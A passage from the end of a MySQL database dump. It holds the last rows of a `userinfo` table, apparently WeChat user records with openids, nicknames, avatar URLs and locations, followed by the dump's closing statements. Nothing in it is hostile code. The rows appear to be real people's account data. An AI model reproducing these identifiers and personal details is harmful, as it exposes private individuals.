01:19:33'),('o0fkt47dQPnzznso1-AKMBeKJSKM','护卫天使','https://thirdwx.qlogo.cn/mmopen/vi_32/1lbqmHlHTuxRRw6wTnYbxyLZia1rhtAyaMVYAjfsn26axja92vGVDicqI0guDiaXAzrica3XnD9gtmjOP3rdzavJKA/132',1,301,'Guizhou','Guiyang',NULL,'2021-10-07 11:24:57'),('o0fkt47EoHtSjLtyO9TQ9GU3Menc','Heart','https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83erb11l2hVNib9heW5iccu6hVctMewwiaQMbeMeFxb2kPhna3lO1uHNSmgvqwxdy7vL1IJIUlY41IZiaBQ/132',0,-623830239,'','',NULL,'2021-10-04 02:31:41'),('o0fkt47keMlTnMPFXkk1kqDl52bg','陈晨','https://thirdwx.qlogo.cn/mmopen/vi_32/0jOVIGI8jx73Ok12aeCgtadZyn4OyQKwG9licXLpRdXibmibnUHrgbV1nNQnfBtBXBHgLNrGlIGLnCjGB6vNePZiaw/132',2,0,'','',NULL,'2021-10-07 11:34:19'),('o0fkt47Y4uodZ36rCAWP22ITxYFs','Reking','https://thirdwx.qlogo.cn/mmopen/vi_32/NuATxcSbpiaj5CvwLN4m2YVy1fttVKkXRpTVOfpfgRABPKOqxiaict0RDkH1KTWawQfEOpbK5PSOUCqIajLt9BOjg/132',0,0,'','',NULL,'2021-10-07 13:03:33'),('o0fkt49kgqs3NITfdskt2e_TTHcI','行一','https://thirdwx.qlogo.cn/mmopen/vi_32/uNgaN4MNicdnlCdu5gSM4HECDj7DVWqMWX9C7fe2ok2ias3ibNkwXzh3FdU7pib65TUGZoM9y8icw14STmfJeIUWXVQ/132',1,0,'','',NULL,'2021-10-06 04:45:39'),('o0fkt4xazjkZRuV_m7z1UwNw_E7Q','王凯','https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83eqAOJaibE1aF6CFZPvHS9xyZPwLnvXGhZ5Yju3Jn34s5AqT7QYhKYibcCrZL7ibg1zXbG2KibStqa1nFQ/132',1,0,'Beijing','Changping',NULL,'2021-10-08 10:26:39'),('o0fkt4y1OTpG8nKwJ_NZQKnt-Kdg','蒋维茜','https://thirdwx.qlogo.cn/mmhead/flS6dJAtuf0ibGGRo2CeE12mBicMgNbx90MdE5RWDRPA0/132',0,0,'','',NULL,'2021-10-08 21:36:07'),('o0fkt4_PEr7h6gGkXVMrNDsq3kwg','默～','https://thirdwx.qlogo.cn/mmopen/vi_32/ZmozZB3eYbsc0Bksem3LP01PK0VPwZlGW2Kc1UdfU2RaRxkLo9UUzq10K7o2Wxz0Uusia8Dg1TiahOChcRSpwHjg/132',1,171,'','',NULL,'2021-10-08 11:53:26'),('o0fkt4_WXoWWC8uYOcAi8QTpOubA','匿名','https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTKGHPzCZ9c3riaCyfPibVQwfwnS5nIiaicHSALI77QHic8wGoaezCDKfjRt1icchfmuQ4byAiclPEnoBvibPA/132',1,12000,'Fujian','Xiamen',NULL,'2021-10-05 14:41:49');
/*!40000 ALTER TABLE `userinfo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Dumping routines for database 'ry'
--
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2022-04-04 22:51:25
